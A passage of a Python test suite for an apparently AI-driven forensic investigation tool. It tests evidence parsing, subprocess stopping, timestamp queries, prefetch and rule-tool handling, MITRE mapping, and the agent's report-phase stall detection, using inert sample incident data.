        assert host == "LNX-WEB01" and "description" in note
        assert _infer_host_from_description("A firewall observation", log)[0] == ""


class TestHeadlineKeepsQuotesBalanced:
    def test_cut_inside_a_quotation_drops_it(self):
        from core.answer_synthesis import _plain_headline
        h = _plain_headline("Attacker created service account 'svc-sync' (UID 1002) on LNX-WEB01 — "
                            "auth.log shows 'useradd: add new user svc-sync' at 09:36:42Z and "
                            "'usermod: add svc-sync to sudo group' at 09:37:10Z")
        assert h.count("'") % 2 == 0 and not h.endswith("'useradd")


class TestEvidenceSourcesFromInventory:
    def test_lists_the_case_classes(self, tmp_path):
        from core.report_assemble import _evidence_source_lines
        (tmp_path / ".atlas").mkdir()
        (tmp_path / ".atlas" / "evidence_inventory.json").write_text(json.dumps({"assessment": {"what_exists": {
            "counts": {"disk": 1, "pcap": 1, "tabular": 2},
            "sample_paths": {"disk": ["evidence/LNX-WEB01.img"], "tabular": ["evidence/a.csv", "evidence/b.jsonl"]}}}}))
        lines = "\n".join(_evidence_source_lines(tmp_path))
        assert "tabular: 2 files" in lines and "`evidence/LNX-WEB01.img`" in lines
        assert "Hayabusa" not in lines

    def test_generic_line_without_inventory(self, tmp_path):
        from core.report_assemble import _evidence_source_lines
        lines = _evidence_source_lines(tmp_path)
        assert len(lines) == 1 and "evidence/" in lines[0]


class TestEvidenceHeadingVariants:
    def test_plain_evidence_heading_is_parsed(self):
        from core.evidence_links import parse_evidence_links
        md = "# Case\n\n## Evidence\n| Label | Kind | Path |\n|---|---|---|\n| LNX-WEB01 | disk | evidence/LNX-WEB01.img |\n"
        labels = [e.get("label") for e in parse_evidence_links(md)["entries"]]
        assert "LNX-WEB01" in labels


class TestEmptyReplyDetection:
    def test_only_a_billed_empty_reply_counts(self):
        from types import SimpleNamespace as NS
        from agent.loop import _empty_reply
        assert _empty_reply(NS(content="", tool_calls=[], output_tokens=40))
        assert not _empty_reply(NS(content="text", tool_calls=[], output_tokens=40))
        assert not _empty_reply(NS(content="", tool_calls=[], output_tokens=0))



class TestTemplatePlaceholdersAreNotLinks:
    def test_example_rows_yield_no_entries(self):
        from core.evidence_links import parse_evidence_links
        md = ("# Case: X\n\n## Evidence Links\n\n| Label | Kind | Path | Notes |\n|---|---|---|---|\n"
              "| <HOST> | disk | evidence/<HOST>/<image>.vmdk | <descriptor or E01> |\n"
              "| <EDR_NAME> | alias | <HOST> | EDR device name |\n"
              "| WS01 | disk | evidence/WS01/disk.vmdk | real |\n")
        entries = parse_evidence_links(md)["entries"]
        assert [e["label"] for e in entries] == ["WS01"]

    def test_shipped_template_has_no_live_example_rows(self):
        from pathlib import Path
        from core.evidence_links import parse_evidence_links
        md = Path("case-template/CASE.md").read_text(encoding="utf-8")
        assert parse_evidence_links(md)["entries"] == []


class TestCreateCaseCopiesSkeletonOnly:
    def test_run_state_and_caches_are_not_copied(self, tmp_path, monkeypatch):
        import dashboard.case_admin as ca
        tpl = tmp_path / "tpl"
        (tpl / "analysis" / "__pycache__").mkdir(parents=True)
        (tpl / ".atlas").mkdir()
        (tpl / "CASE.md").write_text("# Case: <CASE_ID>\n\n## Investigation Requests\n")
        (tpl / ".atlas" / "evidence_profile.json").write_text("{}")
        (tpl / "analysis" / "brain_injection.json").write_text("{}")
        (tpl / "analysis" / "__pycache__" / "x.pyc").write_bytes(b"")
        (tpl / "analysis" / "keep.py").write_text("print(1)\n")
        monkeypatch.setattr(ca, "_CASE_TEMPLATE", tpl)
        monkeypatch.setattr(ca, "_sync_tasks", lambda *a, **k: None)
        dest = ca.create_case(str(tmp_path / "cases"), "NEWCASE")
        assert (dest / "analysis" / "keep.py").is_file()
        assert not (dest / ".atlas").exists()
        assert not (dest / "analysis" / "brain_injection.json").exists()
        assert not (dest / "analysis" / "__pycache__").exists()
        assert "NEWCASE" in (dest / "CASE.md").read_text()


class TestStopEndsToolChildren:
    """A stop ends the tool subprocess a worker thread is waiting on, so the
    run can write its exit record instead of waiting out the tool's timeout."""

    def test_running_child_is_terminated_and_marked_interrupted(self):
        import threading
        import core.executor as ex
        ex._STOP_EVENT.clear()
        out = {}

        def work():
            out["r"] = ex.run(["sleep", "30"], timeout=60)

        t = threading.Thread(target=work); t.start()
        deadline = time.time() + 5
        while not ex._ACTIVE_CHILDREN and time.time() < deadline:
            time.sleep(0.05)
        assert ex.terminate_active_children() >= 1
        t.join(timeout=10)
        ex._STOP_EVENT.clear()
        assert not t.is_alive()
        assert out["r"]["success"] is False and out["r"].get("interrupted") is True
        assert not ex._ACTIVE_CHILDREN

    def test_hard_stop_kills_the_process_group(self, monkeypatch):
        import dashboard.run_manager as rm
        seen = {}

        class FakeProc:
            pid = 4242
            def wait(self, timeout=None):
                return 0
        monkeypatch.setattr(rm.os, "killpg", lambda pid, sig: seen.__setitem__("killed", (pid, sig)))
        rm._kill_run_group(FakeProc())
        assert seen["killed"][0] == 4242

    def test_dashboard_starts_the_run_in_its_own_session(self):
        import inspect
        import dashboard.run_manager as rm
        assert "start_new_session=True" in inspect.getsource(rm)


class TestTextReader:
    def test_utf16_document_is_decoded_and_paged(self, tmp_path):
        from tools.strings_tools import read_text
        doc = tmp_path / "task.xml"
        doc.write_bytes("\ufeff<?xml version=\"1.0\"?>\n<Task><Exec><Command>cmd.exe</Command></Exec></Task>\n".encode("utf-16-le"))
        out = read_text(str(doc), max_lines=1)
        assert out["success"] and out["encoding"] == "utf-16"
        assert out["lines"] == ['<?xml version="1.0"?>'] and out["truncated"] and out["next_start_line"] == 2
        hit = read_text(str(doc), grep="cmd\\.exe")
        assert hit["lines"] == ["2: <Task><Exec><Command>cmd.exe</Command></Exec></Task>"]

    def test_utf16_without_bom_and_plain_utf8(self, tmp_path):
        from tools.strings_tools import read_text
        a = tmp_path / "a.txt"; a.write_bytes("hello world\n".encode("utf-16-le"))
        b = tmp_path / "b.ps1"; b.write_text("Write-Host 'x'\n", encoding="utf-8")
        assert read_text(str(a))["lines"] == ["hello world"]
        assert read_text(str(b))["lines"] == ["Write-Host 'x'"]

    def test_gate_routes_documents_to_the_reader_and_tables_to_table_tools(self, tmp_path):
        from core.input_kind import _check_path_for_tool
        xml = tmp_path / "t.xml"; xml.write_text("<a><b>1</b></a>\n<c/>\n")
        csvf = tmp_path / "t.csv"; csvf.write_text("a,b\n1,2\n3,4\n")
        assert _check_path_for_tool("strings_read_text", str(xml)) is None
        r = _check_path_for_tool("strings_strings_grep", str(xml))
        assert r and r["use_instead"] == "strings.read_text"
        r = _check_path_for_tool("strings_strings_grep", str(csvf))
        assert r and "table" in r["use_instead"]


class TestIsoTimestampComparison:
    def test_iso_values_pass_the_refusal_and_compare_as_text(self):
        from tools.tabular import _iso_like, _refuse_non_numeric_compare
        assert _iso_like("2031-02-04") and _iso_like("2031-02-04T12:00:00Z") and not _iso_like("May 14")
        assert _refuse_non_numeric_compare([("TimeCreated", ">", "2031-02-04")], ["TimeCreated"]) is None
        assert _refuse_non_numeric_compare([("TimeCreated", ">", "May 14")], ["TimeCreated"])

    def test_query_filters_by_timestamp(self, tmp_path):
        from tools.tabular import table_query
        f = tmp_path / "ev.csv"
        f.write_text("TimeCreated,EventId\n2031-02-03 10:00:00,1\n2031-02-04 12:00:00,2\n2031-02-05 01:00:00,3\n")
        out = table_query(str(f), where=["TimeCreated>2031-02-04"])
        ids = [r.get("EventId") for r in out.get("rows", [])]
        assert out["success"] and ids == ["2", "3"]


class TestDairWindowNudgeAndFindings:
    def test_record_finding_is_not_window_gated(self):
        from core.middleware import DAIR_GATE_ALLOWLIST
        assert "misc_record_finding" in DAIR_GATE_ALLOWLIST


class TestPrefetchFallback:
    def _fake_pyscca(self, monkeypatch):
        import sys, types, datetime
        mod = types.ModuleType("pyscca")

        class PF:
            executable_filename = "TOOLX.EXE"; prefetch_hash = 0x1A2B3C4D; format_version = 30; run_count = 3
            number_of_filenames = 2
            def get_last_run_time(self, i):
                if i > 1: raise IndexError
                return datetime.datetime(2031, 2, 4, 12, 0, 0) - datetime.timedelta(days=i)
            def get_filename(self, i): return ["\\VOLUME\\WINDOWS\\SYSTEM32\\NTDLL.DLL", "\\VOLUME\\TOOLX.EXE"][i]
        mod.open = lambda path: PF()
        monkeypatch.setitem(sys.modules, "pyscca", mod)

    def test_platform_refusal_triggers_the_fallback_csv(self, tmp_path, monkeypatch):
        import tools.eztools as ez
        self._fake_pyscca(monkeypatch)
        pf = tmp_path / "TOOLX.EXE-1A2B3C4D.pf"; pf.write_bytes(b"MAM\x04" + b"\x00" * 16)
        out_dir = tmp_path / "analysis"; out_dir.mkdir()
        monkeypatch.setattr(ez, "_ez", lambda *a, **k: {"success": True, "stdout": "\nNon-Windows platforms not supported due to the need to load decompression specific Windows libraries! Exiting...\n"})
        monkeypatch.setattr(ez, "assert_output_safe", lambda p: None)
        out = ez.ez_pecmd(str(pf), str(out_dir), "prefetch.csv")
        assert out["success"] and out["records"] == 1
        text = (out_dir / "prefetch.csv").read_text()
        assert "TOOLX.EXE" in text and "2031-02-04 12:00:00" in text and "1A2B3C4D" in text

    def test_missing_parser_gives_an_install_hint(self, tmp_path, monkeypatch):
        import sys
        import tools.eztools as ez
        monkeypatch.setitem(sys.modules, "pyscca", None)
        pf = tmp_path / "x.pf"; pf.write_bytes(b"MAM\x04")
        out = ez._prefetch_fallback(str(pf), str(tmp_path), "p.csv")
        assert out["success"] is False and "libscca-python" in out["error"]


class TestIdenticalCallReplay:
    def test_compacted_result_is_detected(self):
        from agent.loop import Agent
        from core.llm_check import _TOOL_STUB

        class Stub:
            messages = [
                {"role": "tool", "tool_call_id": "a", "content": "real output"},
                {"role": "tool", "tool_call_id": "b", "content": _TOOL_STUB},
            ]
        assert Agent._result_still_in_context(Stub(), "a") is True
        assert Agent._result_still_in_context(Stub(), "b") is False
        assert Agent._result_still_in_context(Stub(), "missing") is False


class TestYaraBundledRules:
    def test_bundled_rules_dir_is_found(self):
        from tools.yara_tools import bundled_rules_dir
        d = bundled_rules_dir()
        assert d and d.endswith("rules") and os.path.isdir(d)

    def test_omitting_both_uses_the_bundled_rules(self, monkeypatch):
        import pytest
        pytest.importorskip("yara")
        import tools.yara_tools as yt
        seen = {}
        monkeypatch.setattr(yt, "_compile_rules", lambda p: seen.setdefault("path", p))
        yt._compile_rules_or_inline(None, None)
        assert seen["path"] == yt.bundled_rules_dir()


class TestMitreCoverage:
    def _stix(self):
        def ap(tid, name, phases):
            return {"type": "attack-pattern", "id": f"attack-pattern--{tid}", "name": name,
                    "external_references": [{"source_name": "mitre-attack", "external_id": tid}],
                    "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": p} for p in phases],
                    "description": "d"}
        return {"objects": [ap("T1583", "Acquire Infrastructure", ["resource-development"]),
                            ap("T1059", "Command and Scripting Interpreter", ["execution"]),
                            ap("T1078", "Valid Accounts", ["defense-evasion", "persistence"])]}

    def test_every_live_technique_is_kept_with_a_relevance_flag(self):
        from tools.mitre.build_mitre_cache import build_tables
        techniques, _, _, _ = build_tables(self._stix(), {})
        assert set(techniques) >= {"T1583", "T1059", "T1078"}
        assert techniques["T1583"]["dfir_relevant"] is False
        assert techniques["T1059"]["dfir_relevant"] is True
        assert ", " in techniques["T1078"]["tactic"]

    def test_mapping_prefers_observable_techniques(self, tmp_path):
        from tools.correlate import mitre_map
        table = {"techniques": {
            "T1583": {"name": "Acquire Infrastructure", "tactic": "Resource Development", "keywords": ["domain"], "dfir_relevant": False},
            "T1071": {"name": "Application Layer Protocol", "tactic": "Command And Control", "keywords": ["domain", "beacon"], "dfir_relevant": True},
        }}
        p = tmp_path / "m.json"; p.write_text(json.dumps(table))
        out = mitre_map("beacon to a domain", table_path=str(p))
        ids = [c["technique_id"] for c in out["candidates"]]
        assert ids == ["T1071"]


class TestToolAvailabilityMarks:
    def test_missing_program_marks_its_tool(self, monkeypatch):
        import core.paths as paths
        import tools.tool_capabilities as reg
        # Patch the resolver the registry actually uses. Patching
        # shutil.which alone left the answer to whatever the test host had
        # installed, because the resolver also searches the install dirs.
        monkeypatch.setattr(
            paths, "tool_program",
            lambda b, *rest: None if b == "densityscout" else "/usr/bin/x")
        gone = reg.unavailable_tools()
        assert gone.get("misc.densityscout_scan", "").startswith("program densityscout")
        assert "tsk.fls" not in gone
        text = reg.format_tool_manifest_for_prompt(max_tools_per_capability=100)
        assert "misc.densityscout_scan (not installed)" in text


class TestChainsawRules:
    def test_no_rules_is_a_clear_refusal_not_a_doomed_run(self, tmp_path, monkeypatch):
        import tools.misc as misc
        monkeypatch.setattr(misc, "_bin_or_warn", lambda name: "/usr/local/bin/chainsaw")
        monkeypatch.setattr(misc, "_CHAINSAW_ROOTS", (str(tmp_path / "nowhere"),))
        called = {}
        monkeypatch.setattr(misc, "run", lambda *a, **k: called.setdefault("cmd", a[0]))
        out = misc.chainsaw_hunt(str(tmp_path))
        assert out["success"] is False and "Sigma rules" in out["error"] and not called

    def test_installed_rules_and_mapping_are_used(self, tmp_path, monkeypatch):
        import tools.misc as misc
        root = tmp_path / "chainsaw"
        (root / "sigma" / "windows").mkdir(parents=True)
        (root / "sigma" / "windows" / "r.yml").write_text("title: x\n")
        (root / "mappings").mkdir()
        (root / "mappings" / "sigma-event-logs-all.yml").write_text("x: 1\n")
        monkeypatch.setattr(misc, "_bin_or_warn", lambda name: "/usr/local/bin/chainsaw")
        monkeypatch.setattr(misc, "_CHAINSAW_ROOTS", (str(root),))
        called = {}
        monkeypatch.setattr(misc, "run", lambda cmd, **k: called.setdefault("cmd", cmd) or {"success": True})
        misc.chainsaw_hunt(str(tmp_path / "evtx"))
        cmd = called["cmd"]
        assert cmd[cmd.index("-s") + 1] == str(root / "sigma")
        assert cmd[cmd.index("--mapping") + 1] == str(root / "mappings" / "sigma-event-logs-all.yml")


class TestAbsenceIsAboutTheArtifactItself:
    """A negative finding that names the file it searched is not a claim
    that the file is missing."""

    def test_search_results_inside_a_file_are_not_absence_claims(self):
        from core.artifact_value import _absent_target
        for stmt in (
            "No event log clearing detected on HOST. Security log (EID 1102) shows zero records. af.event_log_clear on security_events.csv found nothing.",
            "No failed logon events (EID 4625) during the window. table.table_query on security_events.csv where EventId=4625 returned 0 matched_rows.",
            "Security event log (security_events.csv, 12,000,000 bytes) was parsed and queried. No EID 1102 records found within the CSV.",
            "hash abc123 absent from a.csv, b.csv and mft.csv",
        ):
            for base in ("security_events.csv", "mft.csv", "a.csv"):
                assert not _absent_target(stmt, base), (stmt, base)

    def test_direct_absence_of_the_file_is_detected(self):
        from core.artifact_value import _absent_target
        assert _absent_target("Security.evtx is not present on the image", "security.evtx")
        assert _absent_target("No Security.evtx was found under winevt/Logs", "security.evtx")
        assert _absent_target("Amcache.hve missing from the appcompat directory", "amcache.hve")
        assert _absent_target("the analyst could not find NTUSER.DAT for the account", "ntuser.dat")
        assert _absent_target("absence of Prefetch files: no *.pf present", "prefetch")


class TestRepeatedChallengeGuidance:
    def test_third_challenge_of_the_same_finding_carries_guidance(self, monkeypatch):
        import tools.reasoning as rs
        import core.execution_log as elog
        finding = "toolx.exe at C:\\users\\public is the ransomware encryptor that wrote the .locked files"
        for _ in range(2):
            elog.log._entries.append({"type": "reason_call", "tool": "reason_evaluate_finding", "call_id": 1,
                                      "conclusion": "VERDICT: CHALLENGED — cite the hash",
                                      "inputs": {"user_message": f"FINDING: {finding} (reworded slightly)\nSUPPORTING_EVIDENCE: x"}})
            # new evidence between attempts, so the reformulation gate stays quiet
            elog.log._entries.append({"type": "tool_call", "success": True, "call_id": 2, "cmd": "strings -a x"})
        monkeypatch.setattr(rs, "_ask", lambda *a, **k: {"success": True, "conclusion": "VERDICT: CHALLENGED — quote the URL verbatim"})
        monkeypatch.setattr(elog.log, "record_self_correction", lambda **k: 0)
        out = rs.reason_evaluate_finding(finding, "strings output", input_call_ids=[1])
        assert out["repeated_challenges"] == 3 and "Do not evaluate it again" in out["conclusion"]

    def test_first_challenge_has_no_guidance(self, monkeypatch):
        import tools.reasoning as rs
        import core.execution_log as elog
        monkeypatch.setattr(rs, "_ask", lambda *a, **k: {"success": True, "conclusion": "VERDICT: CHALLENGED — cite it"})
        monkeypatch.setattr(elog.log, "record_self_correction", lambda **k: 0)
        out = rs.reason_evaluate_finding("a brand new finding about a scheduled task named connect_bot", "evidence", input_call_ids=[1])
        assert "repeated_challenges" not in out


class TestAttributionNeedsDistinctiveTechniques:
    def test_generic_overlap_stops_at_low(self):
        from tools.attribution import _classify_confidence, distinctive_techniques, technique_group_counts
        common = ["T1021.001", "T1021.002", "T1053.005", "T1486", "T1059.001"]
        groups = {f"G{i:04d}": {"technique_ids": list(common)} for i in range(30)}
        groups["G0999"] = {"technique_ids": common + ["T9999.001"]}
        counts = technique_group_counts(groups)
        assert distinctive_techniques(set(common), counts, len(groups)) == set()
        assert distinctive_techniques(set(common) | {"T9999.001"}, counts, len(groups)) == {"T9999.001"}
        assert _classify_confidence(5, 4, distinctive=0) == "LOW"
        assert _classify_confidence(5, 4, distinctive=1) == "MEDIUM"
        assert _classify_confidence(5, 4, distinctive=2) == "HIGH"
        assert _classify_confidence(5, 4) == "HIGH"     # legacy call keeps its meaning


class TestVolumeOffsetMemory:
    def test_offset_is_remembered_and_defaulted(self, tmp_path, monkeypatch):
        from core.mount_plan import note_volume_offset, volume_offset
        import tools.sleuthkit as sk
        (tmp_path / ".atlas").mkdir()
        img = tmp_path / "disk.raw"; img.write_bytes(b"\0" * 16)
        monkeypatch.setattr("core.paths.active_case_dir", lambda: str(tmp_path))
        assert sk._offset_args(str(img), None) == []
        sk._note_volume(str(img), 206848, {"success": True})
        assert volume_offset(tmp_path, img) == 206848
        assert sk._offset_args(str(img), None) == ["-o", "206848"]
        assert sk._offset_args(str(img), 2048) == ["-o", "2048"]
        res = sk._note_volume(str(img), 2048, {"success": False, "stderr": "Metadata address too large"})
        assert "206848" in res["hint"]


class TestReportPhaseStall:
    def _agent(self, tmp_path):
        from agent.loop import Agent
        a = Agent.__new__(Agent)
        a.case_dir = tmp_path
        return a

    def test_fires_after_quiet_turns_in_report_then_rearms(self, tmp_path, monkeypatch):
        import agent.loop as lp
        a = self._agent(tmp_path)
        monkeypatch.setattr(lp, "REPORT_STALL_TURNS", 3)
        monkeypatch.setattr(lp.Agent, "_claim_count", lambda self: 40)
        blockers = {"n": 3}
        monkeypatch.setattr(lp.Agent, "_report_blockers", lambda self: blockers["n"])
        assert not a._report_phase_stalled(10)          # not in Report
        a._note_dair_phase(json.dumps({"current_phase": "Report"}))
        assert not a._report_phase_stalled(10)          # baseline taken
        assert not a._report_phase_stalled(12)
        assert a._report_phase_stalled(13)              # 3 quiet turns
        assert not a._report_phase_stalled(14)          # re-armed
        monkeypatch.setattr(lp.Agent, "_claim_count", lambda self: 41)
        assert a._report_phase_stalled(20)              # a belief is not progress here
        blockers["n"] = 2
        assert not a._report_phase_stalled(21)          # fewer blockers reset the clock

    def test_a_belief_does_not_buy_time_before_the_gate_is_asked(
            self, tmp_path, monkeypatch):
        """A run that never asks whether it may report is not closing out,
        however many beliefs it adds: it can sit a whole phase in Report,
        recording occasionally, and never once be asked to finish."""
        import agent.loop as lp
        a = self._agent(tmp_path)
        monkeypatch.setattr(lp, "REPORT_STALL_TURNS", 3)
        monkeypatch.setattr(lp.Agent, "_report_blockers", lambda self: None)
        claims = {"n": 40}
        monkeypatch.setattr(lp.Agent, "_claim_count", lambda self: claims["n"])
        a._note_dair_phase(json.dumps({"current_phase": "Report"}))
        assert not a._report_phase_stalled(10)          # entered Report
        claims["n"] = 41                                # a new belief...
        assert not a._report_phase_stalled(11)
        claims["n"] = 42                                # ...and another
        assert a._report_phase_stalled(13), (
            "recording beliefs must not postpone the question indefinitely")

    def test_once_the_gate_is_asked_fewer_blockers_count_and_a_belief_does_not(
            self, tmp_path, monkeypatch):
        """After the gate's first verdict, moving towards the report is the
        verdict's blocking issues reaching a new low. A belief recorded while
        the blockers stand (a variant of a finding the gate objects to) buys
        no time, and blockers that rise and fall back to the low buy none."""
        import agent.loop as lp
        a = self._agent(tmp_path)
        monkeypatch.setattr(lp, "REPORT_STALL_TURNS", 3)
        state = {"claims": 40, "blockers": 4}
        monkeypatch.setattr(lp.Agent, "_claim_count", lambda self: state["claims"])
        monkeypatch.setattr(lp.Agent, "_report_blockers", lambda self: state["blockers"])
        a._note_dair_phase(json.dumps({"current_phase": "Report"}))
        assert not a._report_phase_stalled(10)
        state["claims"] = 41
        assert a._report_phase_stalled(13)              # the belief bought nothing
        state["blockers"] = 3
        assert not a._report_phase_stalled(14)          # a new low resets the clock
        state["blockers"] = 5
        assert not a._report_phase_stalled(15)
        state["blockers"] = 3
        assert a._report_phase_stalled(17)              # back to the low is no progress

    def test_the_push_count_restarts_on_a_new_low_of_blockers(self, tmp_path, monkeypatch):
        """Pushes toward the report count in a row until the run moves towards
        it: before the gate's first verdict a new belief restarts the count,
        after it only a new low of blocking issues does."""
        import agent.loop as lp
        a = self._agent(tmp_path)
        monkeypatch.setattr(lp, "REPORT_STALL_WRAPUP_FIRES", 3)
        state = {"claims": 40, "blockers": None}
        monkeypatch.setattr(lp.Agent, "_claim_count", lambda self: state["claims"])
        monkeypatch.setattr(lp.Agent, "_report_blockers", lambda self: state["blockers"])
        assert not a._report_stall_exhausted(1)
        state["claims"] = 41
        assert not a._report_stall_exhausted(2)         # no verdict yet: a belief counts
        state["blockers"] = 4
        assert not a._report_stall_exhausted(3)         # the first verdict
        state["claims"] = 42
        assert not a._report_stall_exhausted(4)
        state["blockers"] = 3
        assert not a._report_stall_exhausted(5)         # a new low restarts the count
        assert not a._report_stall_exhausted(6)
        state["blockers"] = 5
        assert a._report_stall_exhausted(7)             # rising is not progress

    def _ledger(self, case, n_units: int):
        from core.coverage_ledger import save_ledger
        save_ledger(case, {"units": {
            f"u{i}": {"path": f"evidence/images/CORP-WS{i:02d}.dd", "kind": "container",
                      "status": "unseen"} for i in range(n_units)}})

    def _read(self, case, unit: str, status: str = "probed"):
        from core.coverage_ledger import load_ledger, save_ledger
        led = load_ledger(case)
        led["units"][unit]["status"] = status
        save_ledger(case, led)

    def test_a_rerun_reading_open_evidence_in_report_is_never_wrapped_up(
            self, tmp_path, monkeypatch):
        """A rerun's log holds the previous run's gate verdicts (configure()
        resumes the trace); the ladder reads only the verdicts of this run.
        The coverage floor stays one blocking issue until the last unseen
        unit is read, so while the run reads units for the first time the
        Report phase is neither pushed nor wrapped up; once the reads stop,
        the ladder runs as before."""
        import agent.loop as lp
        from core.execution_log import log
        verdict = "READY_TO_REPORT: {r}\nBLOCKING_ISSUES ({n}): {b}\nWARNINGS (0): none"
        for n in (1, 0):                                  # the previous run's verdicts
            log.record_reason_call(tool="reason_pre_report_check", success=True, directives={},
                                   conclusion=verdict.format(r="true" if n == 0 else "false", n=n,
                                                             b="none" if n == 0 else "floor"))
        a = self._agent(tmp_path)
        a._run_since = a._last_call_id()                  # what run() stamps at its start
        assert a._report_blockers() is None
        log.record_reason_call(tool="reason_pre_report_check", success=True, directives={},
                               conclusion=verdict.format(r="false", n=1, b="Coverage ledger floor "
                                                         "not met - read each unseen unit"))
        assert a._report_blockers() == 1
        monkeypatch.setattr(lp, "REPORT_STALL_TURNS", 3)
        monkeypatch.setattr(lp, "REPORT_STALL_WRAPUP_FIRES", 3)
        monkeypatch.setattr(lp.Agent, "_claim_count", lambda self: 40)
        self._ledger(tmp_path, 25)
        a._note_dair_phase(json.dumps({"current_phase": "Report"}))
        wrapped: list[int] = []

        def turn_of(t: int) -> None:
            # The loop's order: a stall pushes, a push may wrap up.
            if a._report_phase_stalled(t) and a._report_stall_exhausted(t):
                wrapped.append(t)
        for turn in range(1, 41):
            if turn % 2 == 0:                             # a unit read for the first time
                self._read(tmp_path, f"u{turn // 2}")
            if turn % 9 == 0:                             # syntheses push meanwhile
                a._report_synth_calls = lp.REPORT_STALL_SYNTHESES
            turn_of(turn)
        assert not wrapped
        self._read(tmp_path, "u3", "answered")            # a finding on a read unit: no read
        for turn in range(41, 60):
            turn_of(turn)
        # Pushes at 43, 46 and 49 with nothing read: wrapped up at the third.
        assert wrapped[0] == 49

    def test_a_unit_registered_mid_run_counts_when_it_is_read(self, tmp_path, monkeypatch):
        import agent.loop as lp
        from core.coverage_ledger import load_ledger, save_ledger
        monkeypatch.setattr(lp.Agent, "_report_blockers", lambda self: 1)
        a = self._agent(tmp_path)
        self._ledger(tmp_path, 2)
        assert a._report_moved("_m", claims=False)        # the baseline
        led = load_ledger(tmp_path)
        led["units"]["d0"] = {"path": "analysis/extracted/CORP-WS00", "kind": "derived",
                              "status": "unseen"}
        save_ledger(tmp_path, led)
        assert not a._report_moved("_m", claims=False)    # registered unseen: nothing read
        self._read(tmp_path, "d0")
        assert a._report_moved("_m", claims=False)        # read for the first time
        self._read(tmp_path, "d0", "answered")
        assert not a._report_moved("_m", claims=False)    # answered after the read: no read

    def test_a_unit_a_rebuild_drops_does_not_hide_the_next_first_read(self, tmp_path, monkeypatch):
        """A ledger rebuild mid-run can drop units; what was discharged is
        kept by identity, so the next first read of another unit still
        counts."""
        import agent.loop as lp
        from core.coverage_ledger import load_ledger, save_ledger
        monkeypatch.setattr(lp.Agent, "_report_blockers", lambda self: 1)
        a = self._agent(tmp_path)
        self._ledger(tmp_path, 4)
        self._read(tmp_path, "u0")
        self._read(tmp_path, "u1")
        assert a._report_moved("_m", claims=False)        # the baseline
        led = load_ledger(tmp_path)
        del led["units"]["u0"], led["units"]["u1"]        # the rebuild drops two read units
        save_ledger(tmp_path, led)
        assert not a._report_moved("_m", claims=False)
        self._read(tmp_path, "u2")
        assert a._report_moved("_m", claims=False)        # a first read still counts

    def _tasks(self, case, tasks):
        (case / ".atlas" / "investigation_tasks.json").write_text(json.dumps(
            {"schema_version": "1.0", "case_id": "CASE-A", "next_id": len(tasks) + 1,
             "tasks": tasks}), encoding="utf-8")

    def test_closing_requests_is_report_work_and_a_reclose_is_not(self, tmp_path, monkeypatch):
        """The gate names every actionable request in one blocking issue
        until the last is dispositioned; closing them one by one is the work
        it asks for. A part answered or limited, or a request blocked on
        missing evidence, counts once; a part reopened and closed again does
        not."""
        import agent.loop as lp
        monkeypatch.setattr(lp.Agent, "_report_blockers", lambda self: 1)
        (tmp_path / ".atlas").mkdir(exist_ok=True)

        def tasks(part_status, other_status):
            return [{"id": "T-001", "text": "Which account logged on to CORP-WS01?", "status": "open",
                     "parts": [{"id": "p1", "text": "account", "status": part_status},
                               {"id": "p2", "text": "time", "status": "open"}]},
                    {"id": "T-002", "text": "What left the host?", "status": other_status}]
        a = self._agent(tmp_path)
        self._tasks(tmp_path, tasks("open", "open"))
        assert a._report_moved("_m", claims=False)        # the baseline
        assert not a._report_moved("_m", claims=False)
        self._tasks(tmp_path, tasks("answered", "open"))
        assert a._report_moved("_m", claims=False)        # a part closed
        self._tasks(tmp_path, tasks("open", "open"))
        assert not a._report_moved("_m", claims=False)    # reopened
        self._tasks(tmp_path, tasks("limited", "open"))
        assert not a._report_moved("_m", claims=False)    # closed again: known
        self._tasks(tmp_path, tasks("limited", "blocked_missing_evidence"))
        assert a._report_moved("_m", claims=False)        # a request dispositioned

    def test_repeated_syntheses_in_report_also_fire(self, tmp_path, monkeypatch):
        import agent.loop as lp
        a = self._agent(tmp_path)
        monkeypatch.setattr(lp, "REPORT_STALL_SYNTHESES", 2)
        monkeypatch.setattr(lp.Agent, "_claim_count", lambda self: 40)
        a._note_dair_phase(json.dumps({"current_phase": "Report"}))
        a._report_synth_calls = 2
        assert a._report_phase_stalled(30)
        assert a._report_synth_calls == 0               # re-armed


class TestSecondStopSignalDuringExit:
    def _case(self, tmp_path):
        case = tmp_path / "case"
        (case / ".atlas").mkdir(parents=True)
        (case / "evidence").mkdir()
        (case / "CASE.md").write_text("# Case: T\n\n**Case ID:** T\n\n## Investigation Requests\n- What happened?\n", encoding="utf-8")
        _graph_with_claims(case, 2)
        return case

    def test_interrupt_inside_the_projection_still_yields_a_report(self, tmp_path, monkeypatch):
        import agent.cli as cli
        import core.investigation_state as st
        case = self._case(tmp_path)
        def boom(*a, **k):
            raise KeyboardInterrupt
        monkeypatch.setattr(st, "project_report_from_state", boom)
        class Stopped:
            stats = {"stopped_reason": "keyboard_interrupt"}
            def _report_written(self):
                return False
        cli._ensure_report_on_exit(case, Stopped())
        out = case / "reports" / "T_investigation_report.md"
        assert out.is_file() and "Written at run end" in out.read_text(encoding="utf-8")

    def test_hurry_flag_skips_narrative_generation(self, monkeypatch):
        import core.report_projection as rp
        called = {}
        monkeypatch.setattr(rp, "default_llm_section_generator", lambda c, m: called.setdefault("llm", True) or "prose")
        rp.HURRY.set()
        try:
            sec = {}
            text = rp.resilient_section_generator({"section_id": "exec_summary", "claims": []}, sec)
        finally:
            rp.HURRY.clear()
        assert "llm" not in called and sec["generator"] == "deterministic_fallback" and text

    def test_exit_signal_handler_sets_hurry_instead_of_raising(self):
        import os, signal, time
        import agent.cli as cli
        import core.report_projection as rp
        rp.HURRY.clear()
        old = signal.getsignal(signal.SIGTERM)
        try:
            cli._arm_exit_signals()
            os.kill(os.getpid(), signal.SIGTERM)
            time.sleep(0.05)
            assert rp.HURRY.is_set()
        finally:
            signal.signal(signal.SIGTERM, old)
            rp.HURRY.clear()


class TestPersistedBlockersBecomeLimitations:
    def _synth(self, blockers):
        return {"type": "reason_call", "tool": "reason_synthesize", "success": True,
                "conclusion": "ANALYSIS\n\n1. LOGICAL GAPS\n- x\n\nBLOCKERS:\n" + "\n".join(f"- {b}" for b in blockers) + "\n\nRECOMMENDATIONS:\n- y\n"}

    def test_unchanged_blocker_after_work_is_a_limitation_new_one_is_not(self):
        from tools.reasoning import _split_persisted_blockers
        entries = [
